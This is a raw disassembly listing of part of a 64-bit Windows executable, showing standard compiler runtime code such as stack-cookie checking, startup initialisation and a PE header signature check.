   1400016eb:	74 2d                	je     0x14000171a
   1400016ed:	49 8b 56 10          	mov    0x10(%r14),%rdx
   1400016f1:	48 2b d1             	sub    %rcx,%rdx
   1400016f4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400016fb:	72 18                	jb     0x140001715
   1400016fd:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140001701:	48 83 c2 27          	add    $0x27,%rdx
   140001705:	49 2b c8             	sub    %r8,%rcx
   140001708:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   14000170c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001710:	77 21                	ja     0x140001733
   140001712:	49 8b c8             	mov    %r8,%rcx
   140001715:	e8 52 01 00 00       	call   0x14000186c
   14000171a:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000171f:	48 03 c7             	add    %rdi,%rax
   140001722:	49 89 3e             	mov    %rdi,(%r14)
   140001725:	49 89 46 08          	mov    %rax,0x8(%r14)
   140001729:	48 8d 04 2f          	lea    (%rdi,%rbp,1),%rax
   14000172d:	49 89 46 10          	mov    %rax,0x10(%r14)
   140001731:	eb 79                	jmp    0x1400017ac
   140001733:	ff 15 cf 1a 00 00    	call   *0x1acf(%rip)        # 0x140003208
   140001739:	cc                   	int3
   14000173a:	4d 8b fc             	mov    %r12,%r15
   14000173d:	4c 2b fb             	sub    %rbx,%r15
   140001740:	49 3b f7             	cmp    %r15,%rsi
   140001743:	73 40                	jae    0x140001785
   140001745:	49 8b fc             	mov    %r12,%rdi
   140001748:	4c 8b c6             	mov    %rsi,%r8
   14000174b:	48 2b fe             	sub    %rsi,%rdi
   14000174e:	49 8b cc             	mov    %r12,%rcx
   140001751:	48 8b d7             	mov    %rdi,%rdx
   140001754:	e8 0b 10 00 00       	call   0x140002764
   140001759:	4a 8d 04 26          	lea    (%rsi,%r12,1),%rax
   14000175d:	48 2b fb             	sub    %rbx,%rdi
   140001760:	4c 2b e7             	sub    %rdi,%r12
   140001763:	49 89 46 08          	mov    %rax,0x8(%r14)
   140001767:	49 8b cc             	mov    %r12,%rcx
   14000176a:	4c 8b c7             	mov    %rdi,%r8
   14000176d:	48 8b d3             	mov    %rbx,%rdx
   140001770:	e8 ef 0f 00 00       	call   0x140002764
   140001775:	4c 8b c6             	mov    %rsi,%r8
   140001778:	48 8b d5             	mov    %rbp,%rdx
   14000177b:	48 8b cb             	mov    %rbx,%rcx
   14000177e:	e8 e1 0f 00 00       	call   0x140002764
   140001783:	eb 2f                	jmp    0x1400017b4
   140001785:	49 8d 3c 11          	lea    (%r9,%rdx,1),%rdi
   140001789:	4d 8b c7             	mov    %r15,%r8
   14000178c:	48 8b cf             	mov    %rdi,%rcx
   14000178f:	e8 d0 0f 00 00       	call   0x140002764
   140001794:	49 8d 04 3f          	lea    (%r15,%rdi,1),%rax
   140001798:	4c 8b c6             	mov    %rsi,%r8
   14000179b:	48 8b d5             	mov    %rbp,%rdx
   14000179e:	49 89 46 08          	mov    %rax,0x8(%r14)
   1400017a2:	48 8b cb             	mov    %rbx,%rcx
   1400017a5:	e8 ba 0f 00 00       	call   0x140002764
   1400017aa:	eb 08                	jmp    0x1400017b4
   1400017ac:	4c 8b ac 24 88 00 00 	mov    0x88(%rsp),%r13
   1400017b3:	00 
   1400017b4:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   1400017b9:	48 83 c4 48          	add    $0x48,%rsp
   1400017bd:	41 5e                	pop    %r14
   1400017bf:	41 5c                	pop    %r12
   1400017c1:	5f                   	pop    %rdi
   1400017c2:	5e                   	pop    %rsi
   1400017c3:	5d                   	pop    %rbp
   1400017c4:	5b                   	pop    %rbx
   1400017c5:	c3                   	ret
   1400017c6:	e8 15 00 00 00       	call   0x1400017e0
   1400017cb:	cc                   	int3
   1400017cc:	e8 9f f9 ff ff       	call   0x140001170
   1400017d1:	cc                   	int3
   1400017d2:	cc                   	int3
   1400017d3:	cc                   	int3
   1400017d4:	cc                   	int3
   1400017d5:	cc                   	int3
   1400017d6:	cc                   	int3
   1400017d7:	cc                   	int3
   1400017d8:	cc                   	int3
   1400017d9:	cc                   	int3
   1400017da:	cc                   	int3
   1400017db:	cc                   	int3
   1400017dc:	cc                   	int3
   1400017dd:	cc                   	int3
   1400017de:	cc                   	int3
   1400017df:	cc                   	int3
   1400017e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400017e4:	48 8d 0d 05 1d 00 00 	lea    0x1d05(%rip),%rcx        # 0x1400034f0
   1400017eb:	ff 15 d7 18 00 00    	call   *0x18d7(%rip)        # 0x1400030c8
   1400017f1:	cc                   	int3
   1400017f2:	cc                   	int3
   1400017f3:	cc                   	int3
   1400017f4:	cc                   	int3
   1400017f5:	cc                   	int3
   1400017f6:	cc                   	int3
   1400017f7:	cc                   	int3
   1400017f8:	cc                   	int3
   1400017f9:	cc                   	int3
   1400017fa:	cc                   	int3
   1400017fb:	cc                   	int3
   1400017fc:	cc                   	int3
   1400017fd:	cc                   	int3
   1400017fe:	cc                   	int3
   1400017ff:	cc                   	int3
   140001800:	cc                   	int3
   140001801:	cc                   	int3
   140001802:	cc                   	int3
   140001803:	cc                   	int3
   140001804:	cc                   	int3
   140001805:	cc                   	int3
   140001806:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000180d:	00 00 00 
   140001810:	48 3b 0d e9 37 00 00 	cmp    0x37e9(%rip),%rcx        # 0x140005000
   140001817:	75 10                	jne    0x140001829
   140001819:	48 c1 c1 10          	rol    $0x10,%rcx
   14000181d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140001822:	75 01                	jne    0x140001825
   140001824:	c3                   	ret
   140001825:	48 c1 c9 10          	ror    $0x10,%rcx
   140001829:	e9 12 03 00 00       	jmp    0x140001b40
   14000182e:	cc                   	int3
   14000182f:	cc                   	int3
   140001830:	40 53                	rex push %rbx
   140001832:	48 83 ec 20          	sub    $0x20,%rsp
   140001836:	48 8b d9             	mov    %rcx,%rbx
   140001839:	eb 0f                	jmp    0x14000184a
   14000183b:	48 8b cb             	mov    %rbx,%rcx
   14000183e:	e8 b1 0d 00 00       	call   0x1400025f4
   140001843:	85 c0                	test   %eax,%eax
   140001845:	74 13                	je     0x14000185a
   140001847:	48 8b cb             	mov    %rbx,%rcx
   14000184a:	e8 ab 0d 00 00       	call   0x1400025fa
   14000184f:	48 85 c0             	test   %rax,%rax
   140001852:	74 e7                	je     0x14000183b
   140001854:	48 83 c4 20          	add    $0x20,%rsp
   140001858:	5b                   	pop    %rbx
   140001859:	c3                   	ret
   14000185a:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   14000185e:	74 06                	je     0x140001866
   140001860:	e8 43 04 00 00       	call   0x140001ca8
   140001865:	cc                   	int3
   140001866:	e8 05 f9 ff ff       	call   0x140001170
   14000186b:	cc                   	int3
   14000186c:	e9 57 04 00 00       	jmp    0x140001cc8
   140001871:	cc                   	int3
   140001872:	cc                   	int3
   140001873:	cc                   	int3
   140001874:	40 53                	rex push %rbx
   140001876:	48 83 ec 20          	sub    $0x20,%rsp
   14000187a:	48 8d 05 a7 1a 00 00 	lea    0x1aa7(%rip),%rax        # 0x140003328
   140001881:	48 8b d9             	mov    %rcx,%rbx
   140001884:	48 89 01             	mov    %rax,(%rcx)
   140001887:	f6 c2 01             	test   $0x1,%dl
   14000188a:	74 0a                	je     0x140001896
   14000188c:	ba 18 00 00 00       	mov    $0x18,%edx
   140001891:	e8 d6 ff ff ff       	call   0x14000186c
   140001896:	48 8b c3             	mov    %rbx,%rax
   140001899:	48 83 c4 20          	add    $0x20,%rsp
   14000189d:	5b                   	pop    %rbx
   14000189e:	c3                   	ret
   14000189f:	cc                   	int3
   1400018a0:	40 53                	rex push %rbx
   1400018a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400018a6:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400018ab:	e8 56 0d 00 00       	call   0x140002606
   1400018b0:	e8 13 07 00 00       	call   0x140001fc8
   1400018b5:	8b c8                	mov    %eax,%ecx
   1400018b7:	e8 7a 0d 00 00       	call   0x140002636
   1400018bc:	e8 fb 06 00 00       	call   0x140001fbc
   1400018c1:	8b d8                	mov    %eax,%ebx
   1400018c3:	e8 92 0d 00 00       	call   0x14000265a
   1400018c8:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400018cd:	89 18                	mov    %ebx,(%rax)
   1400018cf:	e8 74 04 00 00       	call   0x140001d48
   1400018d4:	84 c0                	test   %al,%al
   1400018d6:	74 73                	je     0x14000194b
   1400018d8:	e8 9f 09 00 00       	call   0x14000227c
   1400018dd:	48 8d 0d d4 09 00 00 	lea    0x9d4(%rip),%rcx        # 0x1400022b8
   1400018e4:	e8 0f 06 00 00       	call   0x140001ef8
   1400018e9:	e8 d2 06 00 00       	call   0x140001fc0
   1400018ee:	8b c8                	mov    %eax,%ecx
   1400018f0:	e8 1d 0d 00 00       	call   0x140002612
   1400018f5:	85 c0                	test   %eax,%eax
   1400018f7:	75 52                	jne    0x14000194b
   1400018f9:	e8 d2 06 00 00       	call   0x140001fd0
   1400018fe:	e8 09 07 00 00       	call   0x14000200c
   140001903:	85 c0                	test   %eax,%eax
   140001905:	74 0c                	je     0x140001913
   140001907:	48 8d 0d ae 06 00 00 	lea    0x6ae(%rip),%rcx        # 0x140001fbc
   14000190e:	e8 f9 0c 00 00       	call   0x14000260c
   140001913:	e8 cc 06 00 00       	call   0x140001fe4
   140001918:	e8 c7 06 00 00       	call   0x140001fe4
   14000191d:	e8 9a 06 00 00       	call   0x140001fbc
   140001922:	8b c8                	mov    %eax,%ecx
   140001924:	e8 25 0d 00 00       	call   0x14000264e
   140001929:	e8 b2 06 00 00       	call   0x140001fe0
   14000192e:	84 c0                	test   %al,%al
   140001930:	74 05                	je     0x140001937
   140001932:	e8 e1 0c 00 00       	call   0x140002618
   140001937:	e8 80 06 00 00       	call   0x140001fbc
   14000193c:	e8 73 08 00 00       	call   0x1400021b4
   140001941:	85 c0                	test   %eax,%eax
   140001943:	75 06                	jne    0x14000194b
   140001945:	48 83 c4 20          	add    $0x20,%rsp
   140001949:	5b                   	pop    %rbx
   14000194a:	c3                   	ret
   14000194b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001950:	e8 db 06 00 00       	call   0x140002030
   140001955:	cc                   	int3
   140001956:	cc                   	int3
   140001957:	cc                   	int3
   140001958:	48 83 ec 28          	sub    $0x28,%rsp
   14000195c:	e8 8f 06 00 00       	call   0x140001ff0
   140001961:	33 c0                	xor    %eax,%eax
   140001963:	48 83 c4 28          	add    $0x28,%rsp
   140001967:	c3                   	ret
   140001968:	48 83 ec 28          	sub    $0x28,%rsp
   14000196c:	e8 9f 08 00 00       	call   0x140002210
   140001971:	e8 46 06 00 00       	call   0x140001fbc
   140001976:	8b c8                	mov    %eax,%ecx
   140001978:	48 83 c4 28          	add    $0x28,%rsp
   14000197c:	e9 d3 0c 00 00       	jmp    0x140002654
   140001981:	cc                   	int3
   140001982:	cc                   	int3
   140001983:	cc                   	int3
   140001984:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001989:	57                   	push   %rdi
   14000198a:	48 83 ec 30          	sub    $0x30,%rsp
   14000198e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001993:	e8 74 03 00 00       	call   0x140001d0c
   140001998:	84 c0                	test   %al,%al
   14000199a:	0f 84 30 01 00 00    	je     0x140001ad0
   1400019a0:	40 32 ff             	xor    %dil,%dil
   1400019a3:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   1400019a8:	e8 23 03 00 00       	call   0x140001cd0
   1400019ad:	8a d8                	mov    %al,%bl
   1400019af:	8b 0d db 3c 00 00    	mov    0x3cdb(%rip),%ecx        # 0x140005690
   1400019b5:	83 f9 01             	cmp    $0x1,%ecx
   1400019b8:	0f 84 1d 01 00 00    	je     0x140001adb
   1400019be:	85 c9                	test   %ecx,%ecx
   1400019c0:	75 4a                	jne    0x140001a0c
   1400019c2:	c7 05 c4 3c 00 00 01 	movl   $0x1,0x3cc4(%rip)        # 0x140005690
   1400019c9:	00 00 00 
   1400019cc:	48 8d 15 1d 19 00 00 	lea    0x191d(%rip),%rdx        # 0x1400032f0
   1400019d3:	48 8d 0d fe 18 00 00 	lea    0x18fe(%rip),%rcx        # 0x1400032d8
   1400019da:	e8 4b 0c 00 00       	call   0x14000262a
   1400019df:	85 c0                	test   %eax,%eax
   1400019e1:	74 0a                	je     0x1400019ed
   1400019e3:	b8 ff 00 00 00       	mov    $0xff,%eax
   1400019e8:	e9 d8 00 00 00       	jmp    0x140001ac5
   1400019ed:	48 8d 15 dc 18 00 00 	lea    0x18dc(%rip),%rdx        # 0x1400032d0
   1400019f4:	48 8d 0d c5 18 00 00 	lea    0x18c5(%rip),%rcx        # 0x1400032c0
   1400019fb:	e8 24 0c 00 00       	call   0x140002624
   140001a00:	c7 05 86 3c 00 00 02 	movl   $0x2,0x3c86(%rip)        # 0x140005690
   140001a07:	00 00 00 
   140001a0a:	eb 08                	jmp    0x140001a14
   140001a0c:	40 b7 01             	mov    $0x1,%dil
   140001a0f:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140001a14:	8a cb                	mov    %bl,%cl
   140001a16:	e8 51 04 00 00       	call   0x140001e6c
   140001a1b:	e8 f8 05 00 00       	call   0x140002018
   140001a20:	48 8b d8             	mov    %rax,%rbx
   140001a23:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001a27:	74 1e                	je     0x140001a47
   140001a29:	48 8b c8             	mov    %rax,%rcx
   140001a2c:	e8 a3 03 00 00       	call   0x140001dd4
   140001a31:	84 c0                	test   %al,%al
   140001a33:	74 12                	je     0x140001a47
   140001a35:	45 33 c0             	xor    %r8d,%r8d
   140001a38:	41 8d 50 02          	lea    0x2(%r8),%edx
   140001a3c:	33 c9                	xor    %ecx,%ecx
   140001a3e:	48 8b 03             	mov    (%rbx),%rax
   140001a41:	ff 15 51 18 00 00    	call   *0x1851(%rip)        # 0x140003298
   140001a47:	e8 d4 05 00 00       	call   0x140002020
   140001a4c:	48 8b d8             	mov    %rax,%rbx
   140001a4f:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001a53:	74 14                	je     0x140001a69
   140001a55:	48 8b c8             	mov    %rax,%rcx
   140001a58:	e8 77 03 00 00       	call   0x140001dd4
   140001a5d:	84 c0                	test   %al,%al
   140001a5f:	74 08                	je     0x140001a69
   140001a61:	48 8b 0b             	mov    (%rbx),%rcx
   140001a64:	e8 df 0b 00 00       	call   0x140002648
   140001a69:	e8 0a 07 00 00       	call   0x140002178
   140001a6e:	0f b7 d8             	movzwl %ax,%ebx
   140001a71:	e8 a8 0b 00 00       	call   0x14000261e
   140001a76:	44 8b cb             	mov    %ebx,%r9d
   140001a79:	4c 8b c0             	mov    %rax,%r8
   140001a7c:	33 d2                	xor    %edx,%edx
   140001a7e:	48 8d 0d 7b e5 ff ff 	lea    -0x1a85(%rip),%rcx        # 0x140000000
   140001a85:	e8 86 f7 ff ff       	call   0x140001210
   140001a8a:	8b d8                	mov    %eax,%ebx
   140001a8c:	e8 2b 07 00 00       	call   0x1400021bc
   140001a91:	84 c0                	test   %al,%al
   140001a93:	74 50                	je     0x140001ae5
   140001a95:	40 84 ff             	test   %dil,%dil
   140001a98:	75 05                	jne    0x140001a9f
   140001a9a:	e8 9d 0b 00 00       	call   0x14000263c
   140001a9f:	33 d2                	xor    %edx,%edx
   140001aa1:	b1 01                	mov    $0x1,%cl
   140001aa3:	e8 e8 03 00 00       	call   0x140001e90
   140001aa8:	8b c3                	mov    %ebx,%eax
   140001aaa:	eb 19                	jmp    0x140001ac5
   140001aac:	8b d8                	mov    %eax,%ebx
   140001aae:	e8 09 07 00 00       	call   0x1400021bc
   140001ab3:	84 c0                	test   %al,%al
   140001ab5:	74 36                	je     0x140001aed
   140001ab7:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140001abc:	75 05                	jne    0x140001ac3
   140001abe:	e8 7f 0b 00 00       	call   0x140002642
   140001ac3:	8b c3                	mov    %ebx,%eax
   140001ac5:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001aca:	48 83 c4 30          	add    $0x30,%rsp
   140001ace:	5f                   	pop    %rdi
   140001acf:	c3                   	ret
   140001ad0:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001ad5:	e8 56 05 00 00       	call   0x140002030
   140001ada:	90                   	nop
   140001adb:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001ae0:	e8 4b 05 00 00       	call   0x140002030
   140001ae5:	8b cb                	mov    %ebx,%ecx
   140001ae7:	e8 02 0b 00 00       	call   0x1400025ee
   140001aec:	90                   	nop
   140001aed:	8b cb                	mov    %ebx,%ecx
   140001aef:	e8 3c 0b 00 00       	call   0x140002630
   140001af4:	90                   	nop
   140001af5:	cc                   	int3
   140001af6:	cc                   	int3
   140001af7:	cc                   	int3
   140001af8:	48 83 ec 28          	sub    $0x28,%rsp
   140001afc:	e8 0f 04 00 00       	call   0x140001f10
   140001b01:	48 83 c4 28          	add    $0x28,%rsp
   140001b05:	e9 7a fe ff ff       	jmp    0x140001984
   140001b0a:	cc                   	int3
   140001b0b:	cc                   	int3
   140001b0c:	40 53                	rex push %rbx
   140001b0e:	48 83 ec 20          	sub    $0x20,%rsp
   140001b12:	48 8b d9             	mov    %rcx,%rbx
   140001b15:	33 c9                	xor    %ecx,%ecx
   140001b17:	ff 15 33 15 00 00    	call   *0x1533(%rip)        # 0x140003050
   140001b1d:	48 8b cb             	mov    %rbx,%rcx
   140001b20:	ff 15 22 15 00 00    	call   *0x1522(%rip)        # 0x140003048
   140001b26:	ff 15 2c 15 00 00    	call   *0x152c(%rip)        # 0x140003058
   140001b2c:	48 8b c8             	mov    %rax,%rcx
   140001b2f:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140001b34:	48 83 c4 20          	add    $0x20,%rsp
   140001b38:	5b                   	pop    %rbx
   140001b39:	48 ff 25 20 15 00 00 	rex.W jmp *0x1520(%rip)        # 0x140003060
   140001b40:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001b45:	48 83 ec 38          	sub    $0x38,%rsp
   140001b49:	b9 17 00 00 00       	mov    $0x17,%ecx
   140001b4e:	ff 15 54 15 00 00    	call   *0x1554(%rip)        # 0x1400030a8
   140001b54:	85 c0                	test   %eax,%eax
   140001b56:	74 07                	je     0x140001b5f
   140001b58:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001b5d:	cd 29                	int    $0x29
   140001b5f:	48 8d 0d 5a 36 00 00 	lea    0x365a(%rip),%rcx        # 0x1400051c0
   140001b66:	e8 a9 00 00 00       	call   0x140001c14
   140001b6b:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001b70:	48 89 05 41 37 00 00 	mov    %rax,0x3741(%rip)        # 0x1400052b8
   140001b77:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140001b7c:	48 83 c0 08          	add    $0x8,%rax
   140001b80:	48 89 05 d1 36 00 00 	mov    %rax,0x36d1(%rip)        # 0x140005258
   140001b87:	48 8b 05 2a 37 00 00 	mov    0x372a(%rip),%rax        # 0x1400052b8
   140001b8e:	48 89 05 9b 35 00 00 	mov    %rax,0x359b(%rip)        # 0x140005130
   140001b95:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140001b9a:	48 89 05 9f 36 00 00 	mov    %rax,0x369f(%rip)        # 0x140005240
   140001ba1:	c7 05 75 35 00 00 09 	movl   $0xc0000409,0x3575(%rip)        # 0x140005120
   140001ba8:	04 00 c0 
   140001bab:	c7 05 6f 35 00 00 01 	movl   $0x1,0x356f(%rip)        # 0x140005124
   140001bb2:	00 00 00 
   140001bb5:	c7 05 79 35 00 00 01 	movl   $0x1,0x3579(%rip)        # 0x140005138
   140001bbc:	00 00 00 
   140001bbf:	b8 08 00 00 00       	mov    $0x8,%eax
   140001bc4:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140001bc8:	48 8d 0d 71 35 00 00 	lea    0x3571(%rip),%rcx        # 0x140005140
   140001bcf:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   140001bd6:	00 
   140001bd7:	b8 08 00 00 00       	mov    $0x8,%eax
   140001bdc:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140001be0:	48 8b 0d 19 34 00 00 	mov    0x3419(%rip),%rcx        # 0x140005000
   140001be7:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140001bec:	b8 08 00 00 00       	mov    $0x8,%eax
   140001bf1:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140001bf5:	48 8b 0d 44 34 00 00 	mov    0x3444(%rip),%rcx        # 0x140005040
   140001bfc:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140001c01:	48 8d 0d 28 17 00 00 	lea    0x1728(%rip),%rcx        # 0x140003330
   140001c08:	e8 ff fe ff ff       	call   0x140001b0c
   140001c0d:	90                   	nop
   140001c0e:	48 83 c4 38          	add    $0x38,%rsp
   140001c12:	c3                   	ret
   140001c13:	cc                   	int3
   140001c14:	40 53                	rex push %rbx
   140001c16:	56                   	push   %rsi
   140001c17:	57                   	push   %rdi
   140001c18:	48 83 ec 40          	sub    $0x40,%rsp
   140001c1c:	48 8b d9             	mov    %rcx,%rbx
   140001c1f:	ff 15 8b 14 00 00    	call   *0x148b(%rip)        # 0x1400030b0
   140001c25:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140001c2c:	33 ff                	xor    %edi,%edi
   140001c2e:	45 33 c0             	xor    %r8d,%r8d
   140001c31:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001c36:	48 8b ce             	mov    %rsi,%rcx
   140001c39:	ff 15 f9 13 00 00    	call   *0x13f9(%rip)        # 0x140003038
   140001c3f:	48 85 c0             	test   %rax,%rax
   140001c42:	74 39                	je     0x140001c7d
   140001c44:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140001c4a:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140001c4f:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140001c54:	4c 8b c8             	mov    %rax,%r9
   140001c57:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001c5c:	4c 8b c6             	mov    %rsi,%r8
   140001c5f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001c64:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001c69:	33 c9                	xor    %ecx,%ecx
   140001c6b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001c70:	ff 15 ca 13 00 00    	call   *0x13ca(%rip)        # 0x140003040
   140001c76:	ff c7                	inc    %edi
   140001c78:	83 ff 02             	cmp    $0x2,%edi
   140001c7b:	7c b1                	jl     0x140001c2e
   140001c7d:	48 83 c4 40          	add    $0x40,%rsp
   140001c81:	5f                   	pop    %rdi
   140001c82:	5e                   	pop    %rsi
   140001c83:	5b                   	pop    %rbx
   140001c84:	c3                   	ret
   140001c85:	cc                   	int3
   140001c86:	cc                   	int3
   140001c87:	cc                   	int3
   140001c88:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   140001c8d:	48 8d 05 dc 16 00 00 	lea    0x16dc(%rip),%rax        # 0x140003370
   140001c94:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001c98:	48 8d 05 c1 16 00 00 	lea    0x16c1(%rip),%rax        # 0x140003360
   140001c9f:	48 89 01             	mov    %rax,(%rcx)
   140001ca2:	48 8b c1             	mov    %rcx,%rax
   140001ca5:	c3                   	ret
   140001ca6:	cc                   	int3
   140001ca7:	cc                   	int3
   140001ca8:	48 83 ec 48          	sub    $0x48,%rsp
   140001cac:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001cb1:	e8 d2 ff ff ff       	call   0x140001c88
   140001cb6:	48 8d 15 0b 22 00 00 	lea    0x220b(%rip),%rdx        # 0x140003ec8
   140001cbd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001cc2:	e8 0f 09 00 00       	call   0x1400025d6
   140001cc7:	cc                   	int3
   140001cc8:	e9 93 09 00 00       	jmp    0x140002660
   140001ccd:	cc                   	int3
   140001cce:	cc                   	int3
   140001ccf:	cc                   	int3
   140001cd0:	48 83 ec 28          	sub    $0x28,%rsp
   140001cd4:	e8 e7 08 00 00       	call   0x1400025c0
   140001cd9:	85 c0                	test   %eax,%eax
   140001cdb:	74 21                	je     0x140001cfe
   140001cdd:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001ce4:	00 00 
   140001ce6:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001cea:	eb 05                	jmp    0x140001cf1
   140001cec:	48 3b c8             	cmp    %rax,%rcx
   140001cef:	74 14                	je     0x140001d05
   140001cf1:	33 c0                	xor    %eax,%eax
   140001cf3:	f0 48 0f b1 0d 9c 39 	lock cmpxchg %rcx,0x399c(%rip)        # 0x140005698
   140001cfa:	00 00 
   140001cfc:	75 ee                	jne    0x140001cec
   140001cfe:	32 c0                	xor    %al,%al
   140001d00:	48 83 c4 28          	add    $0x28,%rsp
   140001d04:	c3                   	ret
   140001d05:	b0 01                	mov    $0x1,%al
   140001d07:	eb f7                	jmp    0x140001d00
   140001d09:	cc                   	int3
   140001d0a:	cc                   	int3
   140001d0b:	cc                   	int3
   140001d0c:	48 83 ec 28          	sub    $0x28,%rsp
   140001d10:	85 c9                	test   %ecx,%ecx
   140001d12:	75 07                	jne    0x140001d1b
   140001d14:	c6 05 85 39 00 00 01 	movb   $0x1,0x3985(%rip)        # 0x1400056a0
   140001d1b:	e8 d4 05 00 00       	call   0x1400022f4
   140001d20:	e8 bb 02 00 00       	call   0x140001fe0
   140001d25:	84 c0                	test   %al,%al
   140001d27:	75 04                	jne    0x140001d2d
   140001d29:	32 c0                	xor    %al,%al
   140001d2b:	eb 14                	jmp    0x140001d41
   140001d2d:	e8 ae 02 00 00       	call   0x140001fe0
   140001d32:	84 c0                	test   %al,%al
   140001d34:	75 09                	jne    0x140001d3f
   140001d36:	33 c9                	xor    %ecx,%ecx
   140001d38:	e8 a3 02 00 00       	call   0x140001fe0
   140001d3d:	eb ea                	jmp    0x140001d29
   140001d3f:	b0 01                	mov    $0x1,%al
   140001d41:	48 83 c4 28          	add    $0x28,%rsp
   140001d45:	c3                   	ret
   140001d46:	cc                   	int3
   140001d47:	cc                   	int3
   140001d48:	40 53                	rex push %rbx
   140001d4a:	48 83 ec 20          	sub    $0x20,%rsp
   140001d4e:	80 3d 4c 39 00 00 00 	cmpb   $0x0,0x394c(%rip)        # 0x1400056a1
   140001d55:	8b d9                	mov    %ecx,%ebx
   140001d57:	75 67                	jne    0x140001dc0
   140001d59:	83 f9 01             	cmp    $0x1,%ecx
   140001d5c:	77 6a                	ja     0x140001dc8
   140001d5e:	e8 5d 08 00 00       	call   0x1400025c0
   140001d63:	85 c0                	test   %eax,%eax
   140001d65:	74 28                	je     0x140001d8f
   140001d67:	85 db                	test   %ebx,%ebx
   140001d69:	75 24                	jne    0x140001d8f
   140001d6b:	48 8d 0d 36 39 00 00 	lea    0x3936(%rip),%rcx        # 0x1400056a8
   140001d72:	e8 ef 08 00 00       	call   0x140002666
   140001d77:	85 c0                	test   %eax,%eax
   140001d79:	75 10                	jne    0x140001d8b
   140001d7b:	48 8d 0d 3e 39 00 00 	lea    0x393e(%rip),%rcx        # 0x1400056c0
   140001d82:	e8 df 08 00 00       	call   0x140002666
   140001d87:	85 c0                	test   %eax,%eax
   140001d89:	74 2e                	je     0x140001db9
   140001d8b:	32 c0                	xor    %al,%al
   140001d8d:	eb 33                	jmp    0x140001dc2
   140001d8f:	66 0f 6f 05 09 16 00 	movdqa 0x1609(%rip),%xmm0        # 0x1400033a0
   140001d96:	00 
   140001d97:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140001d9b:	f3 0f 7f 05 05 39 00 	movdqu %xmm0,0x3905(%rip)        # 0x1400056a8
   140001da2:	00 
   140001da3:	48 89 05 0e 39 00 00 	mov    %rax,0x390e(%rip)        # 0x1400056b8
   140001daa:	f3 0f 7f 05 0e 39 00 	movdqu %xmm0,0x390e(%rip)        # 0x1400056c0
   140001db1:	00 
   140001db2:	48 89 05 17 39 00 00 	mov    %rax,0x3917(%rip)        # 0x1400056d0
   140001db9:	c6 05 e1 38 00 00 01 	movb   $0x1,0x38e1(%rip)        # 0x1400056a1
   140001dc0:	b0 01                	mov    $0x1,%al
   140001dc2:	48 83 c4 20          	add    $0x20,%rsp
   140001dc6:	5b                   	pop    %rbx
   140001dc7:	c3                   	ret
   140001dc8:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001dcd:	e8 5e 02 00 00       	call   0x140002030
   140001dd2:	cc                   	int3
   140001dd3:	cc                   	int3
   140001dd4:	48 83 ec 18          	sub    $0x18,%rsp
   140001dd8:	4c 8b c1             	mov    %rcx,%r8
   140001ddb:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140001de0:	66 39 05 19 e2 ff ff 	cmp    %ax,-0x1de7(%rip)        # 0x140000000
   140001de7:	75 78                	jne    0x140001e61
   140001de9:	48 63 0d 4c e2 ff ff 	movslq -0x1db4(%rip),%rcx        # 0x14000003c
   140001df0:	48 8d 15 09 e2 ff ff 	lea    -0x1df7(%rip),%rdx        # 0x140000000
   140001df7:	48 03 ca             	add    %rdx,%rcx
   140001dfa:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140001e00:	75 5f                	jne    0x140001e61
   140001e02:	b8 0b 02 00 00       	mov    $0x20b,%eax
